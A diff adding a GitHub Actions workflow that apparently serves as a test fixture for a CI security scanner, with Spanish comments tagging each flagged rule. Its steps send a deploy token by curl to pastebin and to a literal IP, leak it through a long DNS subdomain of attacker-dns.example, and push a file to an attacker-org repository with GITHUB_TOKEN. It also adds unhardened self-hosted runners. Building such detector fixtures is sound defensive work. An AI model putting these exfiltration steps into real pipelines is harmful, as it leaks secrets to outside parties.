@@ -1,0 +1,46 @@
+name: Build and report
+
+on:
+  pull_request:   # R1013: sin "branches"/"branches-ignore" -> se dispara para PRs contra cualquier rama
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Reportar métricas de build (exfiltración simulada)
+        env:
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          curl -X POST https://pastebin.com/api/api_post.php -d "token=$DEPLOY_TOKEN"
+          # R1005: dominio de la lista de dominios fraudulentos conocidos (engine/fraudulent_domains.txt)
+
+          curl -X POST http://203.0.113.42/collect -d "token=$DEPLOY_TOKEN"
+          # R1009: llamada directa a una IP literal en vez de a un dominio
+
+          nslookup Z2hwX3Byb2REZXBsb3lUb2tlbjc4OQ.attacker-dns.example
+          # R1015: subdominio anormalmente largo -> patrón de exfiltración por DNS
+          # (el subdominio codifica en base64 el valor "ghp_prodDeployToken789")
+
+      - name: Subir reporte a un repositorio externo
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
+            https://api.github.com/repos/attacker-org/exfil-repo/contents/report.json \
+            -d "{\"content\": \"$(cat report.json | base64)\"}"
+          # R1018: escribe en un repositorio ajeno codificado a fuego en la URL, en vez del propio
+
+  legacy-self-hosted:
+    runs-on: self-hosted   # R1006: runner self-hosted, sin ninguna indicación de hardening
+    steps:
+      - run: ./run-legacy-tests.sh
+
+  cloud-runner:
+    runs-on: [self-hosted, ec2-large]   # R1006 + R1020: self-hosted en la nube (EC2) sin harden-runner
+    steps:
+      - run: ./run-integration-tests.sh
